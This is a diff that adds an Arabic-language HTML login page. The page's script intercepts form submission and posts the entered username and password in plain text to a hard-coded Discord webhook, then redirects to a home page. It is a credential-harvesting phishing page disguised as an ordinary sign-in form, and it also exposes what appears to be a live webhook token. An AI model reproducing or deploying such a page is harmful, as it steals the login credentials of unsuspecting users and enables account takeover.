@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول</title>
+  <link rel="stylesheet" href="css.css">
+</head>
+<body>
+  <div class="login-container">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm" action="#" method="post" onsubmit="sendToWebhook(event)">
+      <label for="username">اسم المستخدم</label>
+      <input type="text" id="username" name="username" required>
+      
+      <label for="password">كلمة المرور</label>
+      <input type="password" id="password" name="password" required>
+      
+      <button type="submit">تسجيل الدخول</button>
+      <p>ليس لديك حساب؟ <a href="/register">إنشاء حساب جديد</a></p>
+      <p><a href="/forgot-password">نسيت كلمة المرور؟</a></p>
+    </form>
+  </div>
+
+  <script>
+    function sendToWebhook(event) {
+      event.preventDefault(); // منع النموذج من الإرسال الافتراضي
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1306735229049896970/BPbsyL5N194lZtDRAZ4vnBI1AgOqXk_arlUMM9OuCpn1Ov3TMSwuFLjLWXrYHdtx8yXU'; // ضع رابط الويب هوك هنا
+
+      const data = {
+        content: `🛡️ تم تسجيل الدخول:\n**اسم المستخدم:** ${username}\n**كلمة المرور:** ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (response.ok) {
+          // إعادة التوجيه إلى الصفحة الرئيسية بعد إرسال البيانات بنجاح
+          window.location.href = 'home.html'; // تأكد من أن الصفحة موجودة بنفس الاسم
+        } else {
+          alert('حدث خطأ أثناء الإرسال إلى Discord');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('خطأ في الاتصال بـ Discord');
+      });
+    }
+  </script>
+</body>
+</html>
